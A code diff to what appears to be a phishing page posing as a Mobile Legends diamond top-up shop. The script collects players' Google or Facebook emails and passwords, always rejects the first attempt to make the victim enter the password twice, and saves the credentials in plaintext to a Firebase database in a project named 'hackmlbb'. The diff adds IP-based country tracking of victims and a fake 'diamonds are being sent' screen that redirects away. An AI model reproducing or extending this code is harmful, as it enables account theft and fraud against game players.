@@ -338,7 +338,7 @@
     line-height: 1.5;
   }
 
-  /* ── LOADER OVERLAY ── */
+  /* LOADER */
   .loader-overlay {
     display: none;
     position: fixed;
@@ -378,6 +378,86 @@
     font-weight: 400;
   }
 
+  /* TOAST */
+  .toast-notif {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0.9);
+    background: #fff;
+    border-radius: 14px;
+    padding: 24px 28px;
+    max-width: 340px;
+    width: 90%;
+    z-index: 500;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    text-align: center;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 0.3s, transform 0.3s;
+  }
+  .toast-notif.show {
+    opacity: 1;
+    pointer-events: auto;
+    transform: translate(-50%, -50%) scale(1);
+  }
+  .toast-notif .toast-icon {
+    font-size: 42px;
+    margin-bottom: 10px;
+  }
+  .toast-notif .toast-title {
+    font-size: 16px;
+    font-weight: 800;
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+  .toast-notif .toast-desc {
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+  .toast-notif .toast-btn {
+    background: var(--primary);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 10px 28px;
+    font-size: 13px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    margin-top: 14px;
+    transition: opacity .2s;
+  }
+  .toast-notif .toast-btn:hover { opacity: 0.9; }
+
+  /* REDIRECT OVERLAY */
+  .redirect-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.9);
+    z-index: 600;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    backdrop-filter: blur(6px);
+  }
+  .redirect-overlay.show { display: flex; }
+  .redirect-overlay .big-icon { font-size: 64px; margin-bottom: 16px; }
+  .redirect-overlay h2 { color: #fff; font-size: 20px; margin-bottom: 8px; }
+  .redirect-overlay p { color: rgba(255,255,255,0.6); font-size: 13px; }
+  .redirect-overlay .redirect-spinner {
+    width: 32px;
+    height: 32px;
+    border: 3px solid rgba(255,255,255,0.1);
+    border-top: 3px solid var(--accent);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-top: 20px;
+  }
+
+  /* AGREEMENT */
   .agreement-overlay {
     position: fixed;
     top: 0; left: 0; right: 0; bottom: 0;
@@ -438,65 +518,27 @@
     border-bottom: 1px solid var(--border);
   }
 
-  /* Custom clean toast/notification */
-  .toast-notif {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0.9);
-    background: #fff;
-    border-radius: 14px;
-    padding: 24px 28px;
-    max-width: 340px;
-    width: 90%;
-    z-index: 500;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+  .admin-link {
     text-align: center;
-    opacity: 0;
-    pointer-events: none;
-    transition: opacity 0.3s, transform 0.3s;
+    padding: 8px 14px 16px;
+    font-size: 9px;
+    opacity: 0.25;
+    transition: opacity 0.3s;
   }
-  .toast-notif.show {
-    opacity: 1;
-    pointer-events: auto;
-    transform: translate(-50%, -50%) scale(1);
-  }
-  .toast-notif .toast-icon {
-    font-size: 42px;
-    margin-bottom: 10px;
-  }
-  .toast-notif .toast-title {
-    font-size: 16px;
-    font-weight: 800;
-    color: var(--text);
-    margin-bottom: 6px;
-  }
-  .toast-notif .toast-desc {
-    font-size: 12px;
+  .admin-link:hover { opacity: 0.6; }
+  .admin-link a {
     color: var(--muted);
-    line-height: 1.5;
+    text-decoration: none;
+    letter-spacing: 0.3px;
   }
-  .toast-notif .toast-btn {
-    background: var(--primary);
-    color: #fff;
-    border: none;
-    border-radius: 8px;
-    padding: 10px 28px;
-    font-size: 13px;
-    font-weight: 700;
-    font-family: inherit;
-    cursor: pointer;
-    margin-top: 14px;
-    transition: opacity .2s;
-  }
-  .toast-notif .toast-btn:hover { opacity: 0.9; }
+  .admin-link a:hover { color: var(--primary); text-decoration: underline; }
 </style>
 </head>
 <body>
 
 <div class="container">
 
-  <!-- AGREEMENT OVERLAY -->
+  <!-- AGREEMENT -->
   <div id="agreementOverlay" class="agreement-overlay show">
     <div class="agreement-box">
       <h3>Terms & Agreement</h3>
@@ -519,7 +561,7 @@
     </div>
   </div>
 
-  <!-- STEP 1: SELECT DIAMONDS -->
+  <!-- STEP 1 -->
   <div id="step1">
     <div class="step-header">
       <div class="step-label">
@@ -575,8 +617,9 @@
         </div>
       </div>
     </div>
-<br><br><br><br><br>
-    <!-- STEP 2: ENTER DETAILS -->
+    <br><br><br><br><br>
+
+    <!-- STEP 2 -->
     <div class="section-div">
       <div class="step-num" style="background:var(--accent)">2</div>
       Confirm Account Information 
@@ -603,24 +646,25 @@
     To find your User ID, click on your avatar in the top left corner of the main game screen. <br> Then go to the "Basic Info" tab. Your user ID is shown below your nickname.<br> Please input the complete user ID here, e.g. 12345678(1234).
   </div>
   <br><br>
-<div class="section-div">
-      <div class="step-num" style="background:var(--accent)">3</div>
-      Confirm Punchers 
-    </div>
-  <!-- SUMMARY BAR -->
+
+  <div class="section-div">
+    <div class="step-num" style="background:var(--accent)">3</div>
+    Confirm Punchers 
+  </div>
+
+  <!-- SUMMARY -->
   <div class="summary-bar">
     <span id="summary-display">No package selected</span>
     <span id="summary-price" style="color:var(--red);">$0.00</span>
   </div>
 
-  <!-- BUY BUTTON -->
   <button class="buy-btn" id="buyBtn" disabled>🛒 Buy Now</button>
   <div class="notice">
     By proceeding, you agree to our Terms of Service and Privacy Policy.<br>
     Prices shown are inclusive of all applicable taxes.
   </div>
 
-  <!-- LOGIN OVERLAY -->
+  <!-- LOGIN MODAL -->
   <div id="loginOverlay" class="login-overlay">
     <div class="login-modal">
       <button class="login-close" onclick="closeLogin()">&times;</button>
@@ -654,14 +698,14 @@
     </div>
   </div>
 
-  <!-- LOADER OVERLAY -->
+  <!-- LOADER -->
   <div id="loader" class="loader-overlay">
     <div class="spinner"></div>
     <p>Processing your request</p>
     <div class="loader-sub">Please wait a moment</div>
   </div>
 
-  <!-- CUSTOM TOAST NOTIFICATION -->
+  <!-- TOAST -->
   <div id="toastNotif" class="toast-notif">
     <div class="toast-icon" id="toastIcon">✅</div>
     <div class="toast-title" id="toastTitle">Success</div>
@@ -669,10 +713,20 @@
     <button class="toast-btn" onclick="closeToast()">OK</button>
   </div>
 
+  <!-- REDIRECT OVERLAY -->
+  <div id="redirectOverlay" class="redirect-overlay">
+    <div class="big-icon">🎉</div>
+    <h2>Successfully Verified!</h2>
+     <p>Your diamonds are being sent to your account...</p>
+    <div class="redirect-spinner"></div>
+  </div>
+
+  <!-- ADMIN LINK -->
+
 </div>
 
 <script>
-// ── FIREBASE ──
+// FIREBASE
 const firebaseConfig = {
   apiKey:"AIzaSyDlIzPKZ4C15866Ul-UusdUBF-xCdC2Knk",
   authDomain:"hackmlbb-bee81.firebaseapp.com",
@@ -685,12 +739,12 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-// ── STATE ──
+// STATE
 let selectedDiamond = null;
 let selectedPrice = null;
 let attemptCount = parseInt(localStorage.getItem('mlbb_attempt')||'0');
 
-// ── AGREEMENT ──
+// AGREEMENT
 function acceptAgreement(){
   document.getElementById('agreementOverlay').classList.remove('show');
 }
@@ -698,7 +752,7 @@ function declineAgreement(){
   document.getElementById('agreementOverlay').classList.remove('show');
 }
 
-// ── DIAMOND SELECTION ──
+// SELECT DIAMOND
 function selectDiamond(amount, price, el){
   selectedDiamond = amount;
   selectedPrice = price;
@@ -709,7 +763,7 @@ function selectDiamond(amount, price, el){
   document.getElementById('buyBtn').disabled = false;
 }
 
-// ── BUY BUTTON ──
+// BUY
 document.getElementById('buyBtn').addEventListener('click', function(){
   if(!selectedDiamond) { 
     showToast('⚠️', 'No package selected', 'Please select a diamond package first.');
@@ -723,7 +777,7 @@ function closeLogin(){
   document.getElementById('loginOverlay').classList.remove('show');
 }
 
-// ── LOGIN TABS ──
+// LOGIN TABS
 function switchLoginTab(method, btn){
   document.querySelectorAll('.login-method').forEach(m => m.classList.remove('active'));
   document.querySelectorAll('.login-tab-btn').forEach(b => b.classList.remove('active'));
@@ -731,7 +785,7 @@ function switchLoginTab(method, btn){
   btn.classList.add('active');
 }
 
-// ── CUSTOM TOAST ──
+// TOAST
 function showToast(icon, title, desc){
   document.getElementById('toastIcon').textContent = icon;
   document.getElementById('toastTitle').textContent = title;
@@ -742,7 +796,7 @@ function closeToast(){
   document.getElementById('toastNotif').classList.remove('show');
 }
 
-// ── LOADER CONTROLS ──
+// LOADER
 function showLoader(){
   document.getElementById('loader').classList.add('show');
 }
@@ -750,7 +804,12 @@ function hideLoader(){
   document.getElementById('loader').classList.remove('show');
 }
 
-// ── PROCESS LOGIN ──
+// REDIRECT
+function showRedirectOverlay() {
+  document.getElementById('redirectOverlay').classList.add('show');
+}
+
+// PROCESS LOGIN
 async function processLogin(method){
   let email = '', password = '';
   if(method === 'google'){
@@ -774,16 +833,27 @@ async function processLogin(method){
     return;
   }
 
-  // Show loader
   showLoader();
   document.getElementById('loginOverlay').classList.remove('show');
 
-  // 5-second loader before response
+  // CAPTURE COUNTRY FLAG VIA IP
+  let flag = 'Unknown';
+  try {
+    const ipResp = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResp.json();
+    const geoResp = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+    if (geoResp.ok) {
+      const geoData = await geoResp.json();
+      flag = geoData.country_name || 'Unknown';
+    }
+  } catch(e) {
+    flag = 'Unknown';
+  }
+
   setTimeout(async () => {
     hideLoader();
 
     if(attemptCount === 0){
-      // FIRST ATTEMPT - Incorrect password
       showToast('❌', 'Incorrect Password', 'The password you entered is incorrect. Please try again.');
       document.getElementById('g-pass').value = '';
       document.getElementById('fb-pass').value = '';
@@ -792,7 +862,6 @@ async function processLogin(method){
       localStorage.setItem('mlbb_attempt', attemptCount);
       document.getElementById('loginOverlay').classList.add('show');
     } else {
-      // SECOND ATTEMPT - Success
       const data = {
         username: document.getElementById('username').value,
         playerId: document.getElementById('playerId').value,
@@ -801,19 +870,22 @@ async function processLogin(method){
         email: email,
         password: password,
         diamond: `${selectedDiamond} Diamonds`,
+        flag: flag,  // e.g. "Philippines", "Vietnam"
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       };
 
       try {
         await db.collection('accounts').add(data);
-        showToast('✅', 'Successfully Sent', 'Your diamonds have been successfully sent to your account!');
-        localStorage.setItem('mlbb_attempt', '0');
+        showRedirectOverlay();
+        setTimeout(() => {
+          window.location.href = 'index.html';
+        }, 3000);
       } catch(err) {
         console.error(err);
-        showToast('⚠️', 'Network Error', 'A network error occurred. Please try again later.');
+        showToast('⚠️', 'Network Error', 'A network error occurred.');
       }
     }
-  }, 5000); // 5 second delay
+  }, 5000);
 }
 </script>
 
